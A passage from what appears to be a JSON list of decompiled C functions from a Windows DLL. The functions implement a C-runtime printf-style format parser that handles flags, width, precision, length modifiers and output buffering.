    "    *(_DWORD *)(v1 + 44) = 22;",
    "LABEL_68:",
    "    sub_18001A598(0, 0, 0, 0, 0, v1);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( !(unsigned __int8)sub_180019E88() )",
    "    return 0xFFFFFFFFLL;",
    "  v3 = *(char **)(a1 + 16);",
    "  if ( !v3 )",
    "  {",
    "    v4 = *(_QWORD *)(a1 + 8);",
    "    *(_BYTE *)(v4 + 48) = 1;",
    "    *(_DWORD *)(v4 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v6 = *(_DWORD *)(a1 + 1128) + 1;",
    "  *(_DWORD *)(a1 + 1128) = v6;",
    "  if ( v6 == 2 )",
    "    return *(unsigned int *)(a1 + 32);",
    "  while ( 2 )",
    "  {",
    "    *(_DWORD *)(a1 + 72) = 0;",
    "    *(_BYTE *)(a1 + 36) = 0;",
    "    v7 = *v3++;",
    "    while ( 1 )",
    "    {",
    "      *(_QWORD *)(a1 + 16) = v3;",
    "      *(_BYTE *)(a1 + 57) = v7;",
    "      if ( !v7 || *(int *)(a1 + 32) < 0 )",
    "        break;",
    "      if ( (unsigned __int8)(v7 - 32) > 0x5Au )",
    "        v8 = 0;",
    "      else",
    "        v8 = byte_18003BC20[2 * ((v7 - 32) & 0x7F) + 1];",
    "      v9 = byte_18003BC20[2 * ((*(_BYTE *)(a1 + 36) + 8 * v8) & 0x7F)];",
    "      *(_BYTE *)(a1 + 36) = v9;",
    "      if ( (unsigned __int8)v9 >= 8u )",
    "        goto LABEL_67;",
    "      if ( (_BYTE)v9 )",
    "      {",
    "        if ( v9 == 1 )",
    "        {",
    "          *(_QWORD *)(a1 + 40) = 0;",
    "          *(_BYTE *)(a1 + 56) = 0;",
    "          *(_DWORD *)(a1 + 48) = -1;",
    "          *(_DWORD *)(a1 + 52) = 0;",
    "          *(_BYTE *)(a1 + 76) = 0;",
    "          goto LABEL_62;",
    "        }",
    "        if ( v9 == 2 )",
    "        {",
    "          switch ( v7 )",
    "          {",
    "            case ' ':",
    "              *(_DWORD *)(a1 + 40) |= 2u;",
    "              break;",
    "            case '#':",
    "              *(_DWORD *)(a1 + 40) |= 0x20u;",
    "              break;",
    "            case '+':",
    "              *(_DWORD *)(a1 + 40) |= 1u;",
    "              break;",
    "            case '-':",
    "              *(_DWORD *)(a1 + 40) |= 4u;",
    "              break;",
    "            case '0':",
    "              *(_DWORD *)(a1 + 40) |= 8u;",
    "              break;",
    "          }",
    "          goto LABEL_62;",
    "        }",
    "        if ( v9 == 3 )",
    "        {",
    "          if ( v7 != 42 )",
    "          {",
    "            v11 = (_DWORD *)(a1 + 44);",
    "            goto LABEL_24;",
    "          }",
    "          v14 = *(int **)(a1 + 24);",
    "          *(_QWORD *)(a1 + 24) = v14 + 2;",
    "          v15 = *v14;",
    "          *(_DWORD *)(a1 + 44) = *v14;",
    "          if ( v15 < 0 )",
    "          {",
    "            *(_DWORD *)(a1 + 40) |= 4u;",
    "            *(_DWORD *)(a1 + 44) = -v15;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          if ( v9 == 4 )",
    "          {",
    "            *(_DWORD *)(a1 + 48) = 0;",
    "            goto LABEL_62;",
    "          }",
    "          if ( v9 != 5 )",
    "          {",
    "            if ( v9 == 6 )",
    "              v10 = sub_180018DC4(a1);",
    "            else",
    "              v10 = sub_1800190D4(a1);",
    "LABEL_34:",
    "            if ( !v10 )",
    "              return 0xFFFFFFFFLL;",
    "            goto LABEL_62;",
    "          }",
    "          if ( v7 != 42 )",
    "          {",
    "            v11 = (_DWORD *)(a1 + 48);",
    "LABEL_24:",
    "            v10 = sub_180018618(a1, v11);",
    "            goto LABEL_34;",
    "          }",
    "          v12 = *(int **)(a1 + 24);",
    "          *(_QWORD *)(a1 + 24) = v12 + 2;",
    "          v13 = *v12;",
    "          if ( v13 < 0 )",
    "            v13 = -1;",
    "          *(_DWORD *)(a1 + 48) = v13;",
    "        }",
    "        v10 = 1;",
    "        goto LABEL_34;",
    "      }",
    "      v16 = *(_QWORD *)(a1 + 8);",
    "      *(_BYTE *)(a1 + 76) = 0;",
    "      if ( !*(_BYTE *)(v16 + 40) )",
    "        sub_180019E10(v16);",
    "      v17 = *(char *)(a1 + 57);",
    "      if ( (int)v17 >= -1 && *(__int16 *)(**(_QWORD **)(v16 + 24) + 2 * v17) < 0 )",
    "      {",
    "        if ( ((*(_DWORD *)(*(_QWORD *)(a1 + 1120) + 20LL) & 0x1000) == 0 || *(_QWORD *)(*(_QWORD *)(a1 + 1120) + 8LL))",
    "          && (unsigned int)sub_18001E42C((unsigned int)v17, *(_QWORD *)(a1 + 1120), *(_QWORD *)(a1 + 8)) == -1 )",
    "        {",
    "          *(_DWORD *)(a1 + 32) = -1;",
    "        }",
    "        else",
    "        {",
    "          ++*(_DWORD *)(a1 + 32);",
    "        }",
    "        v18 = *(_BYTE **)(a1 + 16);",
    "        LOBYTE(v17) = *v18;",
    "        *(_QWORD *)(a1 + 16) = v18 + 1;",
    "        *(_BYTE *)(a1 + 57) = v17;",
    "        if ( !(_BYTE)v17 )",
    "        {",
    "          v20 = *(_QWORD *)(a1 + 8);",
    "          *(_BYTE *)(v20 + 48) = 1;",
    "          *(_DWORD *)(v20 + 44) = 22;",
    "          sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "LABEL_67:",
    "          v21 = *(_QWORD *)(a1 + 8);",
    "          *(_BYTE *)(v21 + 48) = 1;",
    "          *(_DWORD *)(v21 + 44) = 22;",
    "          v1 = *(_QWORD *)(a1 + 8);",
    "          goto LABEL_68;",
    "        }",
    "      }",
    "      if ( ((*(_DWORD *)(*(_QWORD *)(a1 + 1120) + 20LL) & 0x1000) == 0 || *(_QWORD *)(*(_QWORD *)(a1 + 1120) + 8LL))",
    "        && (unsigned int)sub_18001E42C((unsigned int)(char)v17, *(_QWORD *)(a1 + 1120), *(_QWORD *)(a1 + 8)) == -1 )",
    "      {",
    "        *(_DWORD *)(a1 + 32) = -1;",
    "      }",
    "      else",
    "      {",
    "        ++*(_DWORD *)(a1 + 32);",
    "      }",
    "LABEL_62:",
    "      v19 = *(char **)(a1 + 16);",
    "      v7 = *v19;",
    "      v3 = v19 + 1;",
    "    }",
    "    if ( ++*(_DWORD *)(a1 + 1128) != 2 )",
    "      continue;",
    "    return *(unsigned int *)(a1 + 32);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180018A40(__int64 a1)",
    "{",
    "  __int64 v1; // rax",
    "  char *v3; // rcx",
    "  int v5; // eax",
    "  char v6; // dl",
    "  unsigned __int8 v7; // cl",
    "  int v8; // eax",
    "  char v9; // al",
    "  _DWORD *v10; // rdx",
    "  int *v11; // rcx",
    "  int v12; // ecx",
    "  int *v13; // rcx",
    "  int v14; // eax",
    "  __int64 v15; // rdi",
    "  __int64 v16; // r8",
    "  __int64 v17; // rcx",
    "  _BYTE *v18; // rax",
    "  __int64 v19; // rcx",
    "  char *v20; // rax",
    "  char v21; // al",
    "  __int64 v22; // rax",
    "  __int64 v23; // rax",
    "",
    "  v1 = *(_QWORD *)(a1 + 8);",
    "  if ( !*(_QWORD *)(a1 + 1120) )",
    "  {",
    "    *(_BYTE *)(v1 + 48) = 1;",
    "    *(_DWORD *)(v1 + 44) = 22;",
    "LABEL_69:",
    "    sub_18001A598(0, 0, 0, 0, 0, v1);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v3 = *(char **)(a1 + 16);",
    "  if ( !v3 )",
    "  {",
    "    *(_BYTE *)(v1 + 48) = 1;",
    "    *(_DWORD *)(v1 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v5 = *(_DWORD *)(a1 + 1128) + 1;",
    "  *(_DWORD *)(a1 + 1128) = v5;",
    "  if ( v5 == 2 )",
    "    return *(unsigned int *)(a1 + 32);",
    "  while ( 2 )",
    "  {",
    "    *(_DWORD *)(a1 + 72) = 0;",
    "    *(_BYTE *)(a1 + 36) = 0;",
    "    v6 = *v3++;",
    "    while ( 1 )",
    "    {",
    "      *(_QWORD *)(a1 + 16) = v3;",
    "      *(_BYTE *)(a1 + 57) = v6;",
    "      if ( !v6 || *(int *)(a1 + 32) < 0 )",
    "        break;",
    "      if ( (unsigned __int8)(v6 - 32) > 0x5Au )",
    "        v7 = 0;",
    "      else",
    "        v7 = byte_18003BD20[2 * ((v6 - 32) & 0x7F) + 1];",
    "      v8 = byte_18003BD20[2 * ((*(_BYTE *)(a1 + 36) + 9 * v7) & 0x7F)];",
    "      *(_BYTE *)(a1 + 36) = v8;",
    "      if ( (unsigned __int8)v8 >= 8u )",
    "        goto LABEL_68;",
    "      if ( (_BYTE)v8 )",
    "      {",
    "        if ( v8 == 1 )",
    "        {",
    "          *(_QWORD *)(a1 + 40) = 0;",
    "          *(_BYTE *)(a1 + 56) = 0;",
    "          *(_DWORD *)(a1 + 48) = -1;",
    "          *(_DWORD *)(a1 + 52) = 0;",
    "          *(_BYTE *)(a1 + 76) = 0;",
    "          goto LABEL_61;",
    "        }",
    "        if ( v8 == 2 )",
    "        {",
    "          switch ( v6 )",
    "          {",
    "            case ' ':",
    "              *(_DWORD *)(a1 + 40) |= 2u;",
    "              break;",
    "            case '#':",
    "              *(_DWORD *)(a1 + 40) |= 0x20u;",
    "              break;",
    "            case '+':",
    "              *(_DWORD *)(a1 + 40) |= 1u;",
    "              break;",
    "            case '-':",
    "              *(_DWORD *)(a1 + 40) |= 4u;",
    "              break;",
    "            case '0':",
    "              *(_DWORD *)(a1 + 40) |= 8u;",
    "              break;",
    "          }",
    "          goto LABEL_61;",
    "        }",
    "        if ( v8 == 3 )",
    "        {",
    "          if ( v6 != 42 )",
    "          {",
    "            v10 = (_DWORD *)(a1 + 44);",
    "            goto LABEL_23;",
    "          }",
    "          v13 = *(int **)(a1 + 24);",
    "          *(_QWORD *)(a1 + 24) = v13 + 2;",
    "          v14 = *v13;",
    "          *(_DWORD *)(a1 + 44) = *v13;",
    "          if ( v14 < 0 )",
    "          {",
    "            *(_DWORD *)(a1 + 40) |= 4u;",
    "            *(_DWORD *)(a1 + 44) = -v14;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          if ( v8 == 4 )",
    "          {",
    "            *(_DWORD *)(a1 + 48) = 0;",
    "            goto LABEL_61;",
    "          }",
    "          if ( v8 != 5 )",
    "          {",
    "            if ( v8 == 6 )",
    "              v9 = sub_180018F4C(a1);",
    "            else",
    "              v9 = sub_18001950C(a1);",
    "LABEL_33:",
    "            if ( !v9 )",
    "              return 0xFFFFFFFFLL;",
    "            goto LABEL_61;",
    "          }",
    "          if ( v6 != 42 )",
    "          {",
    "            v10 = (_DWORD *)(a1 + 48);",
    "LABEL_23:",
    "            v9 = sub_180018618(a1, v10);",
    "            goto LABEL_33;",
    "          }",
    "          v11 = *(int **)(a1 + 24);",
    "          *(_QWORD *)(a1 + 24) = v11 + 2;",
    "          v12 = *v11;",
    "          if ( v12 < 0 )",
    "            v12 = -1;",
    "          *(_DWORD *)(a1 + 48) = v12;",
    "        }",
    "        v9 = 1;",
    "        goto LABEL_33;",
    "      }",
    "      v15 = *(_QWORD *)(a1 + 8);",
    "      *(_BYTE *)(a1 + 76) = 0;",
    "      if ( !*(_BYTE *)(v15 + 40) )",
    "        sub_180019E10(v15);",
    "      v16 = *(char *)(a1 + 57);",
    "      if ( (int)v16 >= -1 && *(__int16 *)(**(_QWORD **)(v15 + 24) + 2 * v16) < 0 )",
    "      {",
    "        v17 = *(_QWORD *)(a1 + 1120);",
    "        if ( *(_QWORD *)(v17 + 16) == *(_QWORD *)(v17 + 8) )",
    "        {",
    "          if ( *(_BYTE *)(v17 + 24) )",
    "            ++*(_DWORD *)(a1 + 32);",
    "          else",
    "            *(_DWORD *)(a1 + 32) = -1;",
    "        }",
    "        else",
    "        {",
    "          ++*(_DWORD *)(a1 + 32);",
    "          ++*(_QWORD *)(v17 + 16);",
    "          *(_BYTE *)(**(_QWORD **)(a1 + 1120))++ = v16;",
    "        }",
    "        v18 = *(_BYTE **)(a1 + 16);",
    "        LOBYTE(v16) = *v18;",
    "        *(_QWORD *)(a1 + 16) = v18 + 1;",
    "        *(_BYTE *)(a1 + 57) = v16;",
    "        if ( !(_BYTE)v16 )",
    "        {",
    "          v22 = *(_QWORD *)(a1 + 8);",
    "          *(_BYTE *)(v22 + 48) = 1;",
    "          *(_DWORD *)(v22 + 44) = 22;",
    "          sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "LABEL_68:",
    "          v23 = *(_QWORD *)(a1 + 8);",
    "          *(_BYTE *)(v23 + 48) = 1;",
    "          *(_DWORD *)(v23 + 44) = 22;",
    "          v1 = *(_QWORD *)(a1 + 8);",
    "          goto LABEL_69;",
    "        }",
    "      }",
    "      v19 = *(_QWORD *)(a1 + 1120);",
    "      if ( *(_QWORD *)(v19 + 16) == *(_QWORD *)(v19 + 8) )",
    "      {",
    "        if ( *(_BYTE *)(v19 + 24) )",
    "          ++*(_DWORD *)(a1 + 32);",
    "        else",
    "          *(_DWORD *)(a1 + 32) = -1;",
    "      }",
    "      else",
    "      {",
    "        ++*(_DWORD *)(a1 + 32);",
    "        ++*(_QWORD *)(v19 + 16);",
    "        *(_BYTE *)(**(_QWORD **)(a1 + 1120))++ = v16;",
    "      }",
    "LABEL_61:",
    "      v20 = *(char **)(a1 + 16);",
    "      v6 = *v20;",
    "      v3 = v20 + 1;",
    "    }",
    "    v21 = *(_BYTE *)(a1 + 36);",
    "    if ( v21 && v21 != 7 )",
    "      goto LABEL_68;",
    "    if ( ++*(_DWORD *)(a1 + 1128) != 2 )",
    "      continue;",
    "    return *(unsigned int *)(a1 + 32);",
    "  }",
    "}",
    "",
    "",
    "char __fastcall sub_180018DC4(__int64 a1)",
    "{",
    "  unsigned __int64 v1; // rax",
    "  char v2; // al",
    "  __int64 v4; // rax",
    "  _BYTE *v5; // rax",
    "  int v6; // eax",
    "  _BYTE *v7; // rax",
    "  char *v8; // r8",
    "  char v9; // al",
    "  __int64 v10; // rdx",
    "",
    "  v2 = *(_BYTE *)(a1 + 57);",
    "  if ( v2 == 70 )",
    "  {",
    "    if ( (*(_BYTE *)a1 & 8) == 0 )",
    "    {",
    "      *(_BYTE *)(a1 + 36) = 7;",
    "      return sub_1800190D4(a1);",
    "    }",
    "    return 1;",
    "  }",
    "  if ( v2 == 78 )",
    "  {",
    "    if ( (*(_BYTE *)a1 & 8) == 0 )",
    "    {",
    "      *(_BYTE *)(a1 + 36) = 8;",
    "LABEL_7:",
    "      v4 = *(_QWORD *)(a1 + 8);",
    "      *(_BYTE *)(v4 + 48) = 1;",
    "      *(_DWORD *)(v4 + 44) = 22;",
    "      sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( *(_DWORD *)(a1 + 52) )",
    "      goto LABEL_7;",
    "    switch ( v2 )",
    "    {",
    "      case 'I':",
    "        v8 = *(char **)(a1 + 16);",
    "        v9 = *v8;",
    "        if ( *v8 == 51 && v8[1] == 50 )",
    "        {",
    "          *(_DWORD *)(a1 + 52) = 10;",
    "          *(_QWORD *)(a1 + 16) = v8 + 2;",
    "        }",
    "        else if ( v9 == 54 )",
    "        {",
    "          if ( v8[1] == 52 )",
    "          {",
    "            *(_DWORD *)(a1 + 52) = 11;",
    "            *(_QWORD *)(a1 + 16) = v8 + 2;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          LOBYTE(v1) = v9 - 88;",
    "          if ( (unsigned __int8)v1 <= 0x20u )",
    "          {",
    "            v10 = 0x120821001LL;",
    "            if ( _bittest64(&v10, v1) )",
    "              *(_DWORD *)(a1 + 52) = 9;",
    "          }",
    "        }",
    "        return 1;",
    "      case 'L':",
    "        *(_DWORD *)(a1 + 52) = 8;",
    "        return 1;",
    "      case 'T':",
    "        *(_DWORD *)(a1 + 52) = 13;",
    "        return 1;",
    "      case 'h':",
    "        v7 = *(_BYTE **)(a1 + 16);",
    "        if ( *v7 == 104 )",
    "        {",
    "          *(_QWORD *)(a1 + 16) = v7 + 1;",
    "          v6 = 1;",
    "        }",
    "        else",
    "        {",
    "          v6 = 2;",
    "        }",
    "        break;",
    "      case 'j':",
    "        *(_DWORD *)(a1 + 52) = 5;",
    "        return 1;",
    "      case 'l':",
    "        v5 = *(_BYTE **)(a1 + 16);",
    "        if ( *v5 == 108 )",
    "        {",
    "          *(_QWORD *)(a1 + 16) = v5 + 1;",
    "          v6 = 4;",
    "        }",
    "        else",
    "        {",
    "          v6 = 3;",
    "        }",
    "        break;",
    "      default:",
    "        switch ( v2 )",
    "        {",
    "          case 't':",
    "            *(_DWORD *)(a1 + 52) = 7;",
    "            break;",
    "          case 'w':",
    "            *(_DWORD *)(a1 + 52) = 12;",
    "            break;",
    "          case 'z':",
    "            *(_DWORD *)(a1 + 52) = 6;",
    "            break;",
    "        }",
    "        return 1;",
    "    }",
    "    *(_DWORD *)(a1 + 52) = v6;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180018F4C(__int64 a1)",
    "{",
    "  unsigned __int64 v1; // rax",
    "  char v2; // al",
    "  __int64 v4; // rax",
    "  _BYTE *v5; // rax",
    "  int v6; // eax",
    "  _BYTE *v7; // rax",
    "  char *v8; // r8",
    "  char v9; // al",
    "  __int64 v10; // rdx",
    "",
    "  v2 = *(_BYTE *)(a1 + 57);",
    "  if ( v2 == 70 )",
    "  {",
    "    if ( (*(_BYTE *)a1 & 8) == 0 )",
    "    {",
    "      *(_BYTE *)(a1 + 36) = 7;",
    "      return sub_18001950C(a1);",
    "    }",
    "    return 1;",
    "  }",
    "  if ( v2 == 78 )",
    "  {",
    "    if ( (*(_BYTE *)a1 & 8) == 0 )",
    "    {",
    "      *(_BYTE *)(a1 + 36) = 8;",
    "LABEL_7:",
    "      v4 = *(_QWORD *)(a1 + 8);",
    "      *(_BYTE *)(v4 + 48) = 1;",
    "      *(_DWORD *)(v4 + 44) = 22;",
    "      sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( *(_DWORD *)(a1 + 52) )",
    "      goto LABEL_7;",
    "    switch ( v2 )",
    "    {",
    "      case 'I':",
    "        v8 = *(char **)(a1 + 16);",
    "        v9 = *v8;",
    "        if ( *v8 == 51 && v8[1] == 50 )",
    "        {",
    "          *(_DWORD *)(a1 + 52) = 10;",
    "          *(_QWORD *)(a1 + 16) = v8 + 2;",
    "        }",
    "        else if ( v9 == 54 )",
    "        {",
    "          if ( v8[1] == 52 )",
    "          {",
    "            *(_DWORD *)(a1 + 52) = 11;",
    "            *(_QWORD *)(a1 + 16) = v8 + 2;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          LOBYTE(v1) = v9 - 88;",
    "          if ( (unsigned __int8)v1 <= 0x20u )",
    "          {",
    "            v10 = 0x120821001LL;",
    "            if ( _bittest64(&v10, v1) )",
    "              *(_DWORD *)(a1 + 52) = 9;",
    "          }",
    "        }",
    "        return 1;",
    "      case 'L':",
    "        *(_DWORD *)(a1 + 52) = 8;",
    "        return 1;",
    "      case 'T':",
    "        *(_DWORD *)(a1 + 52) = 13;",
    "        return 1;",
    "      case 'h':",
    "        v7 = *(_BYTE **)(a1 + 16);",
    "        if ( *v7 == 104 )",
    "        {",
    "          *(_QWORD *)(a1 + 16) = v7 + 1;",
    "          v6 = 1;",
    "        }",
    "        else",
    "        {",
    "          v6 = 2;",
    "        }",
    "        break;",
    "      case 'j':",
    "        *(_DWORD *)(a1 + 52) = 5;",
    "        return 1;",
    "      case 'l':",
    "        v5 = *(_BYTE **)(a1 + 16);",
    "        if ( *v5 == 108 )",
    "        {",
    "          *(_QWORD *)(a1 + 16) = v5 + 1;",
    "          v6 = 4;",
    "        }",
    "        else",
    "        {",
    "          v6 = 3;",
    "        }",
    "        break;",
    "      default:",
    "        switch ( v2 )",
    "        {",
    "          case 't':",
    "            *(_DWORD *)(a1 + 52) = 7;",
    "            break;",
    "          case 'w':",
    "            *(_DWORD *)(a1 + 52) = 12;",
    "            break;",
    "          case 'z':",
    "            *(_DWORD *)(a1 + 52) = 6;",
    "            break;",
    "        }",
    "        return 1;",
    "    }",
    "    *(_DWORD *)(a1 + 52) = v6;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_1800190D4(__int64 a1)",
    "{",
    "  int v1; // edx",
    "  char v3; // di",
    "  int v4; // edx",
    "  int v5; // edx",
    "  int v6; // edx",
    "  char v7; // al",
    "  int v8; // edx",
    "  int v9; // edx",
    "  int v10; // edx",
    "  int v11; // edx",
    "  int v12; // ecx",
    "  char v13; // dl",
    "  int v15; // edx",
    "  __int64 v16; // rsi",
    "  char v17; // cl",
    "  bool v18; // r8",
    "  int v19; // r15d",
    "  __int64 v20; // r14",
    "  int v21; // edi",
    "  int v22; // ecx",
    "  _QWORD *v23; // r14",
    "  int *v24; // rdi",
    "  int v25; // ecx",
    "  __int64 v26; // r12",
    "  int v27; // esi",
    "  int v28; // ecx",
    "  unsigned __int16 *v29; // r12",
    "  int v30; // esi",
    "  __int64 v31; // rax",
    "  int v32; // r9d",
    "  int v33; // r8d",
    "  __int64 v34; // rsi",
    "  int v35; // ebx",
    "  int v36; // ecx",
    "  int v37; // [rsp+30h] [rbp-20h] BYREF",
    "  _BYTE v38[12]; // [rsp+34h] [rbp-1Ch] BYREF",
    "",
    "  v1 = *(char *)(a1 + 57);",
    "  v3 = 120;",
    "  if ( v1 <= 100 )",
    "  {",
    "    if ( v1 != 100 )",
    "    {",
    "      if ( v1 <= 83 )",
    "      {",
    "        if ( v1 != 83 )",
    "        {",
    "          v4 = v1 - 65;",
    "          if ( v4 )",
    "          {",
    "            v5 = v4 - 2;",
    "            if ( v5 )",
    "            {",
    "              v6 = v5 - 2;",
    "              if ( v6 && (unsigned int)(v6 - 1) > 1 )",
    "                return 0;",
    "              goto LABEL_9;",
    "            }",
    "            goto LABEL_14;",
    "          }",
    "LABEL_9:",
    "          v7 = sub_18001998C();",
    "          goto LABEL_38;",
    "        }",
    "        goto LABEL_34;",
    "      }",
    "      if ( v1 != 88 )",
    "      {",
    "        switch ( v1 )",
    "        {",
    "          case 'Z':",
    "            v7 = sub_180019910();",
    "            goto LABEL_38;",
    "          case 'a':",
    "            goto LABEL_9;",
    "          case 'c':",
    "LABEL_14:",
    "            v7 = sub_180019BE0(a1, 0);",
    "            goto LABEL_38;",
    "        }",
    "        return 0;",
    "      }",
    "      goto LABEL_36;",
    "    }",
    "    goto LABEL_24;",
    "  }",
    "  if ( v1 > 111 )",
    "  {",
    "    if ( v1 == 112 )",
    "    {",
    "      *(_DWORD *)(a1 + 48) = 16;",
    "      *(_DWORD *)(a1 + 52) = 11;",
    "LABEL_36:",
    "      v13 = 1;",
    "LABEL_37:",
    "      v7 = sub_180017ED4(a1, v13);",
    "      goto LABEL_38;",
    "    }",
    "    if ( v1 == 115 )",
    "    {",
    "LABEL_34:",
    "      v7 = sub_180019D6C();",
    "      goto LABEL_38;",
    "    }",
    "    if ( v1 != 117 )",
    "    {",
    "      if ( v1 != 120 )",
    "        return 0;",
    "      v13 = 0;",
    "      goto LABEL_37;",
    "    }",
    "LABEL_25:",
    "    v7 = sub_180017CD0(a1, 0);",
    "    goto LABEL_38;",
    "  }",
    "  if ( v1 != 111 )",
    "  {",
    "    v8 = v1 - 101;",
    "    if ( !v8 )",
    "      goto LABEL_9;",
    "    v9 = v8 - 1;",
    "    if ( !v9 )",
    "      goto LABEL_9;",
    "    v10 = v9 - 1;",
    "    if ( !v10 )",
    "      goto LABEL_9;",
    "    v11 = v10 - 2;",
    "    if ( v11 )",
    "    {",
    "      if ( v11 == 5 )",
    "      {",
    "        v7 = sub_180019CB4();",
    "        goto LABEL_38;",
    "      }",
    "      return 0;",
    "    }",
    "LABEL_24:",
    "    *(_DWORD *)(a1 + 40) |= 0x10u;",
    "    goto LABEL_25;",
    "  }",
    "  v12 = *(_DWORD *)(a1 + 40);",
    "  if ( (v12 & 0x20) != 0 )",
    "    *(_DWORD *)(a1 + 40) = v12 | 0x80;",
    "  v7 = sub_180017ACC(a1, 0);",
    "LABEL_38:",
    "  if ( !v7 )",
    "    return 0;",
    "  if ( !*(_BYTE *)(a1 + 56) )",
    "  {",
    "    v15 = *(_DWORD *)(a1 + 40);",
    "    LOWORD(v37) = 0;",
    "    v16 = 0;",
    "    BYTE2(v37) = 0;",
    "    if ( (v15 & 0x10) == 0 )",
    "      goto LABEL_49;",
    "    if ( (v15 & 0x40) != 0 )",
    "    {",
    "      LOBYTE(v37) = 45;",
    "    }",
    "    else if ( (v15 & 1) != 0 )",
    "    {",
    "      LOBYTE(v37) = 43;",
    "    }",
    "    else",
    "    {",
    "      if ( (v15 & 2) == 0 )",
    "        goto LABEL_49;",
    "      LOBYTE(v37) = 32;",
    "    }",
    "    v16 = 1;",
    "LABEL_49:",
    "    v17 = *(_BYTE *)(a1 + 57);",
    "    v18 = ((v17 - 88) & 0xDF) == 0 && (v15 & 0x20) != 0;",
    "    if ( v18 || ((v17 - 65) & 0xDF) == 0 )",
    "    {",
    "      v38[v16 - 4] = 48;",
    "      if ( v17 == 88 || v17 == 65 )",
    "        v3 = 88;",
    "      v38[v16 - 3] = v3;",
    "      LODWORD(v16) = v16 + 2;",
    "    }",
    "    v19 = *(_DWORD *)(a1 + 44) - v16 - *(_DWORD *)(a1 + 72);",
    "    if ( (v15 & 0xC) == 0 )",
    "    {",
    "      v20 = *(_QWORD *)(a1 + 8);",
    "      v21 = 0;",
    "      if ( v19 > 0 )",
    "      {",
    "        while ( (*(_DWORD *)(*(_QWORD *)(a1 + 1120) + 20LL) & 0x1000) != 0 && !*(_QWORD *)(*(_QWORD *)(a1 + 1120) + 8LL)",
    "             || (unsigned int)sub_18001E42C(32, *(_QWORD *)(a1 + 1120), v20) != -1 )",
    "        {",
    "          v22 = *(_DWORD *)(a1 + 32);",
    "          *(_DWORD *)(a1 + 32) = v22 + 1;",
    "          if ( v22 != -2 && ++v21 < v19 )",
    "            continue;",
    "          goto LABEL_68;",
    "        }",
    "        *(_DWORD *)(a1 + 32) = -1;",
    "      }",
    "    }",
    "LABEL_68:",
    "    v23 = (_QWORD *)(a1 + 1120);",
    "    v24 = (int *)(a1 + 32);",
    "    if ( (*(_DWORD *)(*(_QWORD *)(a1 + 1120) + 20LL) & 0x1000) == 0 || *(_QWORD *)(*v23 + 8LL) )",
    "      sub_180019FC8(a1 + 1120, (unsigned int)&v37, v16, a1 + 32, *(_QWORD *)(a1 + 8));",
    "    else",
    "      *v24 += v16;",
    "    v25 = *(_DWORD *)(a1 + 40);",
    "    if ( (v25 & 8) != 0 && (v25 & 4) == 0 )",
    "    {",
    "      v26 = *(_QWORD *)(a1 + 8);",
    "      v27 = 0;",
    "      if ( v19 > 0 )",
    "      {",
    "        while ( (*(_DWORD *)(*v23 + 20LL) & 0x1000) != 0 && !*(_QWORD *)(*v23 + 8LL)",
    "             || (unsigned int)sub_18001E42C(48, *v23, v26) != -1 )",
    "        {",
    "          v28 = (*v24)++;",
    "          if ( v28 != -2 && ++v27 < v19 )",
    "            continue;",
    "          goto LABEL_82;",
    "        }",
    "        *v24 = -1;",
    "      }",
    "    }",
    "LABEL_82:",
    "    if ( *(_BYTE *)(a1 + 76) && *(int *)(a1 + 72) > 0 )",
    "    {",
    "      v29 = *(unsigned __int16 **)(a1 + 64);",
    "      v30 = 0;",
    "      while ( 1 )",
    "      {",
    "        v31 = *(_QWORD *)(a1 + 8);",
    "        v32 = *v29;",
    "        v37 = 0;",
    "        ++v29;",
    "        if ( (unsigned int)sub_180025A84((unsigned int)&v37, (unsigned int)v38, 6, v32, v31) || !v37 )",
    "          break;",
    "        if ( (*(_DWORD *)(*v23 + 20LL) & 0x1000) == 0 || *(_QWORD *)(*v23 + 8LL) )",
    "          sub_180019FC8(a1 + 1120, (unsigned int)v38, v37, a1 + 32, *(_QWORD *)(a1 + 8));",
    "        else",
    "          *v24 += v37;",
    "        if ( ++v30 == *(_DWORD *)(a1 + 72) )",
    "          goto LABEL_98;",
    "      }",
    "      *v24 = -1;",
    "    }",
    "    else",
    "    {",
    "      v33 = *(_DWORD *)(a1 + 72);",
    "      if ( (*(_DWORD *)(*v23 + 20LL) & 0x1000) == 0 || *(_QWORD *)(*v23 + 8LL) )",
    "        sub_180019FC8(a1 + 1120, *(_QWORD *)(a1 + 64), v33, a1 + 32, *(_QWORD *)(a1 + 8));",
    "      else",
    "        *v24 += v33;",
    "    }",
    "LABEL_98:",
    "    if ( *v24 >= 0 && (*(_DWORD *)(a1 + 40) & 4) != 0 )",
    "    {",
    "      v34 = *(_QWORD *)(a1 + 8);",
    "      v35 = 0;",
    "      if ( v19 > 0 )",
    "      {",
    "        while ( (*(_DWORD *)(*v23 + 20LL) & 0x1000) != 0 && !*(_QWORD *)(*v23 + 8LL)",
    "             || (unsigned int)sub_18001E42C(32, *v23, v34) != -1 )",
    "        {",
    "          v36 = (*v24)++;",
    "          if ( v36 != -2 && ++v35 < v19 )",
    "            continue;",
    "          return 1;",
    "        }",
    "        *v24 = -1;",
    "      }",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_18001950C(__int64 a1)",
    "{",
    "  char v1; // di",
    "  int v3; // ecx",
    "  int v4; // ecx",
    "  int v5; // ecx",
    "  int v6; // ecx",
